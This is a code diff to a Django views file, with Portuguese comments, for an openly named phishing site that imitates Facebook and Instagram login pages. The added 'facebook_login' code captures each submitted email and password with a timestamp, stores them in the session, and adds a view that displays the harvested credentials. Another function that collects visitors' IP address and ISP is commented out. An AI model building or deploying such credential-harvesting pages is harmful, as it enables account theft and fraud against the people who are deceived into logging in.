@@ -4,6 +4,7 @@ from django.http import HttpResponse
 from django.http import JsonResponse
 from user_agents import parse
 import requests
+import datetime
 
 
 def home_view(request):
@@ -25,20 +26,56 @@ def phising_view(request):
 def phising_facebook_view(request):
     return render(request, 'phising_facebook.html')
 
+from django.shortcuts import render
+import datetime
+
 def facebook_login(request):
     if request.method == 'POST':
         email = request.POST.get('email')
-        password = request.POST.get('pass')
+        password = request.POST.get('senha')
 
-        # Aqui você pode adicionar lógica para processar os dados do formulário
-        # Exemplo: autenticar o usuário no Django (se estiver usando autenticação)
+        # Adiciona informações de login à sessão
+        if 'info_usuario_lista' not in request.session:
+            request.session['info_usuario_lista'] = []
 
-        # Exemplo simples: redirecionar diretamente para o Facebook
-        return redirect('https://www.facebook.com/')
-    else:
-        # Lógica para renderizar o formulário de login (se necessário)
-        return render(request, 'login_form.html')
+        # Constrói um dicionário com as informações de login
+        login_info = {
+            'session_id': request.session['session_id'],
+            'login_email': email,
+            'login_time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'login_senha': password,
+        }
+
+        # Adiciona as informações de login à lista na sessão
+        request.session['info_usuario_lista'].append(login_info)
+
+        # Salvando a sessão explicitamente (embora o Django geralmente faça isso automaticamente)
+        request.session.modified = True
+
+        return render(request, 'home.html')
+
     
+
+    
+def phising_instagram_view(request):
+    return render(request, 'phising_instagram.html')
+
+
+
+def mostrar_info_usuario(request):
+    # Pega as informações da sessão
+    info_usuario_lista = request.session.get('info_usuario_lista')
+    
+    # Renderiza o template com as informações da sessão
+    return render(request, 'mostrar_info_usuario.html', {'info_usuario_lista': info_usuario_lista})
+
+def limpar_sessao(request):
+    # Limpa todos os dados da sessão
+    request.session.clear()
+    return redirect('home')
+
+
+"""  
 def capturar_info_usuario(request):
     # Captura informações básicas do usuário
     ip_address = request.META.get('REMOTE_ADDR')
@@ -77,7 +114,7 @@ def capturar_info_usuario(request):
         'isp': isp,
     }
 
-
+"""
 """
 def charts(request):
     # Dados de exemplo
